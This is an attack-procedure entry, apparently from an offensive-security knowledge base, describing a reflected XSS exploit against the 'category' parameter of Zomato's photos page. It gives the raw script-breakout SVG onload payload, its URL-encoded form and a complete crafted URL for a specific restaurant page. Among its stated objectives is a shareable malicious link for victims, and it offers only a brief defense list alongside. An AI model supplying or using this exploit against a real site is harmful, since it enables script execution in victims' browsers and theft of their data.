---
id: proc-inject-xss-payload-230119
tags:
  - xss-injection
  - payload-crafting
  - url-encoding
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-11-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:39.990Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Category-Parameter

## Summary

This procedure crafts and injects a reflected XSS payload into the 'category' parameter of Zomato's photos page, exploiting insufficient sanitization to break out of a script context and execute JavaScript via an SVG onload attribute.

## Description

The vulnerability stems from the 'category' parameter being reflected into a <script> tag without proper escaping, allowing attackers to close the tag and inject HTML/SVG elements. The payload `--></script><svg/onload=';alert(document.domain);'>` terminates the script and adds an executable SVG. URL-encoding ensures safe transmission. This targets mobile users, leading to arbitrary JS execution for data theft. Prerequisites: Access to the photos page.

## Requirements

1. Loaded photos page URL
2. URL encoding knowledge or browser tools
3. Mobile user agent active

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs in script contexts (e.g., use JSON encoding)
- Implement output encoding for HTML attributes and tags
- Deploy Web Application Firewall (WAF) rules to block common XSS payloads like SVG onload

## Objectives

1. Break out of the reflected script context
2. Inject executable JavaScript via SVG
3. Prepare a shareable malicious URL for victims

## Instructions

### Step 1: Craft Raw Payload

**Context**: Design the payload to close the script and inject SVG.

Write `--></script><svg/onload=';alert(document.domain);'>` – the `-->` comments out, `</script>` closes the tag, and SVG executes on load.

### Step 2: URL-Encode the Payload

**Context**: Encode special characters to form a valid URL.

Convert to `%22--%3E%3C%2Fscript%3E%3Csvg%2Fonload%3D%27%3Balert%28document.domain%29%3B%27%3E` using browser dev tools or online encoders.

> Encoding prevents URL parsing errors and ensures delivery.

### Step 3: Append to Base URL

**Context**: Replace the legitimate category with the encoded payload.

Modify the URL to `https://www.zomato.com/manila/artsy-cafe-diliman-quezon-city/photos?category=%22--%3E%3C%2Fscript%3E%3Csvg%2Fonload%3D%27%3Balert%28document.domain%29%3B%27%3E`.

**Expected Output**: Valid URL with embedded payload, ready for testing.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-injection]]
- [[payload-crafting]]
- [[url-encoding]]
